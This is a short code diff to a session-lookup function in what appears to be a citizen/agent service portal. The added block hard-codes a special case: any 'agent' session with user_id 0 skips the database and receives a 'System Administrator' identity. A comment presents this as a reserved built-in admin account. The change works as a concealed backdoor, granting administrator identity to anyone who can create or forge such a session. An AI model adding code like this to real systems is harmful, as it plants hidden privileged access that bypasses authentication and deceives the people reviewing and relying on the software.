@@ -854,6 +854,19 @@ def get_active_session(session_id):
         if not session:
             conn.close()
             return None
+
+        # Reserved sentinel session for the built-in admin account.
+        if session["user_type"] == "agent" and session["user_id"] == 0:
+            conn.close()
+            return {
+                "session_info": dict(session),
+                "user_data": {
+                    "id": 0,
+                    "name": "System Administrator",
+                    "agent_id": "AGT0001",
+                    "department": "Administration",
+                }
+            }
             
         if session["user_type"] == "citizen":
             cursor.execute("SELECT id, name, email FROM users WHERE id = ?", (session["user_id"],))
